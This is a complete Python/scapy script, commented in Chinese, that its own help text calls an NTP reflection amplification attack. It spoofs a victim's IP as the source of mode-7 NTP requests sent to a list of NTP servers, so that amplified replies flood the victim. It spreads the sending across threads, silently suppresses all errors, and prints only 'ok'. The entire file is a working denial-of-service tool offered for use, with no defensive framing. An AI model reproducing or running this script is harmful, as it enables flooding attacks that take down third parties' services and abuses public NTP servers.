#!/usr/bin/env python3
from scapy.all import *
import sys
import threading
import argparse

def send_ntp_packet(target_ip, target_port, ntp_server):
    try:
        # 伪造源IP构造NTP请求包
        packet = IP(dst=ntp_server, src=target_ip) / \
                 UDP(sport=target_port, dport=123) / \
                 Raw(load=b"\x17\x00\x03\x2a" + b"\x00"*4)
        send(packet, verbose=0)
    except Exception as e:
        pass  # 静默处理所有异常

def attack_thread(target_ip, target_port, ntp_servers):
    for server in ntp_servers:
        threading.Thread(target=send_ntp_packet, 
                        args=(target_ip, target_port, server.strip())).start()

def main():
    parser = argparse.ArgumentParser(description='NTP反射放大攻击脚本')
    parser.add_argument('-i', '--ip', required=True, help='目标IP地址')
    parser.add_argument('-p', '--port', type=int, default=54321, help='伪造源端口')
    parser.add_argument('-t', '--threads', type=int, default=10, help='攻击线程数')
    parser.add_argument('-f', '--file', required=True, help='NTP服务器列表文件')
    args = parser.parse_args()

    # 读取NTP服务器列表
    with open(args.file) as f:
        servers = f.read().splitlines()

    # 线程分组处理
    chunk_size = len(servers) // args.threads
    for i in range(0, len(servers), chunk_size):
        threading.Thread(target=attack_thread,
                        args=(args.ip, args.port, 
                             servers[i:i+chunk_size])).start()

    print("ok")  # 仅显示启动标识

if __name__ == "__main__":
    main()
